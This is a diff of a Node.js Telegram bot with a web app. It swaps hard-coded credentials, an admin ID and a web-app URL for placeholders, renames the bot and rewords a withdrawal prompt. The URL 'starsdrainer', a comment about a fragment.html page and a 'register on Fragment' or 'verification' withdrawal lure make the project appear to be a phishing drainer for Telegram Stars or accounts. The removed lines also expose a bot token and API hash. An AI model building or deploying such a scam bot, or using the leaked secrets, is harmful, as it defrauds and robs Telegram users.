@@ -6,15 +6,15 @@ const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 
-const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M7kRd-8OJoo';
-const API_ID = parseInt(process.env.API_ID) || 30427944;
-const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
-const ADMIN_USER_ID = 1398396668;
+const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN';
+const API_ID = parseInt(process.env.API_ID) || 123456;
+const API_HASH = process.env.API_HASH || 'YOUR_API_HASH';
+const ADMIN_USER_ID = 123456789;
 
 // URL, где доступен web-app + статика (fragment.html, stars.jpg, avatar.jpg)
-const WEB_APP_URL = process.env.WEB_APP_URL || 'https://starsdrainer.onrender.com';
+const WEB_APP_URL = process.env.WEB_APP_URL || 'https://your-web-app.url';
 const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || WEB_APP_URL; // для inline-картинок чеков
-const BOT_USERNAME = 'MyBankStar_bot'; // без @
+const BOT_USERNAME = 'MyStarBank_bot'; // без @
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
@@ -298,7 +298,7 @@ bot.on('callback_query', async (query) => {
         } else if (query.data === 'user_withdraw') {
             bot.sendMessage(
                 chatId,
-                `🔐 <b>Для вывода требуется зарегистрироваться на Fragment</b>`,
+                `🔐 <b>Для вывода требуется верификация</b>`,
                 {
                     parse_mode: 'HTML',
                     reply_markup: {
